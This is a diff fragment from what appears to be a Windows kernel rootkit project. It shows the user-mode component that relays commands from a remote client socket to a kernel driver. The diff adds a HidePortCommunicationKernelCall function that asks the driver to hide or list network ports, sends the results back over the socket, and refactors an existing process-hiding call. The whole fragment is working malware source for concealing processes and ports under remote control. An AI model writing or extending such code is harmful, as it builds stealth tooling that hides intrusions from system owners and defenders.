 	RootkInst->MdlName = ModuleName;
 	RootkInst->MedPID = (ULONG64)GetCurrentProcessId();;
-	DriverRes = CallKernelDriver(tosock, RootkInst, TRUE, PipeHandle, MediumLog);
+	DriverRes = CallKernelDriver(ClientToServerSocket, RootkInst, TRUE, PipeHandle, MediumLog);
 	if (!RootkInst->IsFlexible) {
-		printf("transformation of regular data from KM-UM confirmed!\n");
+		LogMessage("transformation of regular data from KM-UM confirmed!\n", MediumLog, FALSE, 0);
 	}
 	else {
-		printf("transformation of regular data from KM-UM not working correctly!!!\n");
+		LogMessage("transformation of regular data from KM-UM not working correctly!!\n", MediumLog, TRUE, GetLastError());
 	}
 
 
 	// Parse returned data correctly (after sending back main struct):
 	if ((DriverRes == 0 || DriverRes == 1) && RequestStatus == SHOWHIDDEN_PROCESS && RootkInst->Size != 0) {
-		result = root_internet::SendData(tosock, RootkInst->Out, RootkInst->Size, FALSE, 0);
+		SocketResult = root_internet::SendData(ClientToServerSocket, RootkInst->Out, RootkInst->Size, FALSE, 0, MediumLog);
 		VirtualFree(RootkInst->Out, 0, MEM_RELEASE);  // Release the allocated memory that was injected into by driver
-		if (result.err || result.value != RootkInst->Size) {
+		if (SocketResult.err || SocketResult.value != RootkInst->Size) {
+			return 0;
+		}
+	}
+	return DriverRes;
+}
+
+
+int DriverCalls::HidePortCommunicationKernelCall(SOCKET ClientToServerSocket, ROOTKIT_MEMORY* RootkInst, char* ModuleName, HANDLE* PipeHandle, LogFile* MediumLog) {
+	PASS_DATA SocketResult = { 0 };
+	int DriverRes = FALSE;
+	PVOID InitAddr = NULL;
+	char FailedSize = 1;
+	NTSTATUS RequestStatus = STATUS_UNSUCCESSFUL;
+	PVOID DummyAddress = NULL;
+
+
+	// Receive the request status to verify if other preperations are needed (add preoperations here if needed):
+	SocketResult = root_internet::RecvData(ClientToServerSocket, sizeof(NTSTATUS), &RequestStatus, FALSE, 0, MediumLog);
+	if (SocketResult.err || SocketResult.value != sizeof(NTSTATUS)) {
+		return 0;
+	}
+
+
+	// Receive the main structure with the parameters for the operation:
+	SocketResult = root_internet::RecvData(ClientToServerSocket, sizeof(ROOTKIT_MEMORY), RootkInst, FALSE, 0, MediumLog);
+	if (SocketResult.err || SocketResult.value != sizeof(ROOTKIT_MEMORY)) {
+		return 0;
+	}
+
+
+	// Set important arguments and verify parameters before sending to driver:
+	if (RequestStatus == SHOWHIDDEN_PORTS) {
+		RootkInst->Out = &DummyAddress;  // A real address from medium should be provided for listing processes/ports
+	}
+
+
+	// Pass struct argument to the driver:
+	RootkInst->Unexpected = successful;
+	RootkInst->MdlName = ModuleName;
+	RootkInst->MedPID = (ULONG64)GetCurrentProcessId();;
+	DriverRes = CallKernelDriver(ClientToServerSocket, RootkInst, TRUE, PipeHandle, MediumLog);
+	if (!RootkInst->IsFlexible) {
+		LogMessage("transformation of regular data from KM-UM confirmed!\n", MediumLog, FALSE, 0);
+	}
+	else {
+		LogMessage("transformation of regular data from KM-UM not working correctly!!\n", MediumLog, TRUE, GetLastError());
+	}
+
+
+	// Parse returned data correctly (after sending back main struct):
+	if ((DriverRes == 0 || DriverRes == 1) && RequestStatus == SHOWHIDDEN_PORTS && RootkInst->Size != 0) {
+		SocketResult = root_internet::SendData(ClientToServerSocket, RootkInst->Out, RootkInst->Size, FALSE, 0, MediumLog);
+		VirtualFree(RootkInst->Out, 0, MEM_RELEASE);  // Release the allocated memory that was injected into by driver
+		if (SocketResult.err || SocketResult.value != RootkInst->Size) {
 			return 0;
 		}
 	}
